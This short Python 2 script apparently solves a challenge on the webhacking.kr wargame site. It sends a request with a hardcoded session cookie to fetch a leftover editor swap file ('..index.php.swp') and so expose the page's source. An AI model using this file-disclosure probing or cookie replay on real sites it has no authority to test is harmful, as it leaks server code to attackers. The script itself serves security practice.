
import requests

url = "http://webhacking.kr/challenge/bonus/bonus-8/..index.php.swp"


headers = {
	"Cookie": "oldzombie=1; PHPSESSID=8aa8b01919b86d9a80f524a71c187ce9",
	"Host": "webhacking.kr"
}

req = requests.get(url,headers=headers)
print req.content